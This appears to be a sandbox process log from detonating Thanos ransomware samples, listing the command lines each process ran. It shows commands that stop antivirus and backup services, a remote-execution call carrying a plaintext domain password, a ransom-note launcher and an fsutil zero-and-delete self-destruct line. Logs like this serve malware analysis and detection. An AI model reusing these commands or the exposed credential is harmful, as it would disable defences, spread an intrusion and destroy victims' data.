+46"."Thanos"."7936"."7356"."8516"."net1.exe"."C:\Windows\system32\net1 stop mfewc /y
+46"."Thanos"."3068"."7388"."4476"."net1.exe"."C:\Windows\system32\net1 stop BackupExecAgentAccelerator /y
+46"."Thanos"."7496"."3012"."5108"."net1.exe"."C:\Windows\system32\net1 stop BackupExecManagementService /y
+46"."Thanos"."4652"."8520"."8696"."net1.exe"."C:\Windows\system32\net1 stop sophos /y
+46"."Thanos"."9260"."4552"."9160"."net1.exe"."C:\Windows\system32\net1 stop BackupExecJobEngine /y
+46"."Thanos"."9256"."6932"."8776"."net1.exe"."C:\Windows\system32\net1 stop BackupExecRPCService /y
+46"."Thanos"."7024"."4848"."1540"."net1.exe"."C:\Windows\system32\net1 stop QBFCService /y
+46"."Thanos"."10208"."8728"."792"."net1.exe"."C:\Windows\system32\net1 stop BackupExecVSSProvider /y
+46"."Thanos"."9820"."8032"."424"."net1.exe"."C:\Windows\system32\net1 stop RTVscan /y
+46"."Thanos"."3916"."8836"."8644"."net1.exe"."C:\Windows\system32\net1 stop PDVFSService /y
+46"."Thanos"."10032"."1884"."8188"."net1.exe"."C:\Windows\system32\net1 stop VSNAPVSS /y
+46"."Thanos"."10196"."9012"."3792"."net1.exe"."C:\Windows\system32\net1 stop veeam /y
+46"."Thanos"."672"."7964"."1640"."rundll32.exe"."rundll32.exe AppXDeploymentExtensions.OneCore.dll,ShellRefresh
+46"."Thanos"."4552"."5968"."632"."wermgr.exe"."C:\Windows\system32\wermgr.exe -upload
+46"."Thanos"."10080"."10084"."9708"."MusNotifyIcon.exe"."%systemroot%\system32\MusNotifyIcon.exe NotifyTrayIcon 13
+46"."Thanos"."9240"."8584"."9024"."MusNotificationUx.exe"."%systemroot%\system32\MusNotificationUx.exe ClearActiveNotifications
+46"."Thanos"."5568"."8584"."9024"."MusNotifyIcon.exe"."%systemroot%\system32\MusNotifyIcon.exe NotifyTrayIcon 13
+46"."Thanos"."10160"."5540"."632"."wermgr.exe"."C:\Windows\system32\wermgr.exe -upload
+47"."Thanos2"."9976"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."12160"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."12216"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."8784"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."4252"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."3112"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."10580"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."11712"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."2564"."11180"."1352"."pxxqfhmv.exe".""C:\Users\ejaz6\AppData\Local\Temp\pxxqfhmv.exe" \10.0.2.15 -u SHJPOLICE\amer -p !Omar2012 -d -f -h -s -n 2 -c C:\Users\ejaz6\OneDrive\Desktop\Thanos\58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."12180"."11180"."1352"."ARP.EXE".""arp" -a
+47"."Thanos2"."11312"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."11620"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."10532"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."4352"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."10880"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."7288"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."9300"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."8872"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."8044"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."1988"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."5532"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."10788"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."11220"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."9776"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."9120"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."7680"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."5316"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."6668"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."12212"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."2392"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."2564"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."11620"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."9100"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."10972"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."9580"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."5320"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."944"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."9424"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."11092"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."9336"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."8060"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."7016"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."7592"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."9952"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."7872"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."9392"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."4252"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."10012"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."9184"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."6452"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."11572"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."6536"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."6724"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."7020"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."9572"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."6180"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."9900"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."9684"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."11876"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."3808"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."12188"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."9888"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."11004"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."12240"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."10300"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."7032"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."10792"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."10676"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."10708"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."1712"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."8124"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."9796"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."3284"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."9324"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."1276"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."11380"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."11288"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."11304"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."10116"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."11088"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."9788"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."10460"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."9336"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."10228"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."3880"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."11784"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."11036"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."12184"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."4752"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."11976"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."12228"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."11044"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."10420"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."11936"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."11224"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."2292"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."4464"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."5404"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."6128"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."7932"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."11020"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."11220"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."6840"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."3804"."11356"."10280"."5wb1pcyq.exe".""C:\Users\ejaz6\AppData\Local\Temp\5wb1pcyq.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."9660"."8220"."10280"."mshta.exe".""C:\Windows\System32\mshta.exe" C:\Users\ejaz6\OneDrive\Desktop\HOW_TO_DECYPHER_FILES.hta
+47"."Thanos2"."1184"."10908"."10280"."cmd.exe".""cmd.exe" /C ping 127.0.0.7 -n 3 > Nul & fsutil file setZeroData offset=0 length=524288 “%s” & Del /f /q “%s”
+47"."Thanos2"."12252"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe
+47"."Thanos2"."11712"."8436"."1352"."yjlixdot.exe".""C:\Users\ejaz6\AppData\Local\Temp\yjlixdot.exe" 7048 58bfb9fa8889550d13f42473956dc2a7ec4f3abb18fd3faeaa38089d513c171f.exe *32
+47"."Thanos2"."12196"."10340"."1184"."fsutil.exe"."fsutil  file setZeroData offset=0 length=524288 “%s”
+47"."Thanos2"."2884"."2392"."5068"."fsutil.exe"."fsutil  file setZeroData offset=0 length=524288 “%s”
+47"."Thanos2"."12080"."11232"."632"."DismHost.exe"."C:\$WinREAgent\Scratch\9BE2A44B-242A-445E-9C49-D87833E0167B\dismhost.exe {086D2C4A-4279-47C8-AA83-DBCC89CB7224}
+48"."Thanos3"."5440"."9128"."5320"."MusNotifyIcon.exe"."%systemroot%\system32\MusNotifyIcon.exe NotifyTrayIcon 13
+48"."Thanos3"."8652"."8768"."8396"."powershell.exe".""powershell" Get-MpPreference -verbose
+48"."Thanos3"."1752"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe
+48"."Thanos3"."6064"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe *32
+48"."Thanos3"."4688"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe
+48"."Thanos3"."9044"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe *32
+48"."Thanos3"."7368"."5460"."8396"."2q24ftxk.exe".""C:\Users\ejaz6\AppData\Local\Temp\2q24ftxk.exe" 3636 c460fc0d4fdaf5c68623e18de106f1c3601d7bd6ba80ddad86c10fd6ea123850.exe
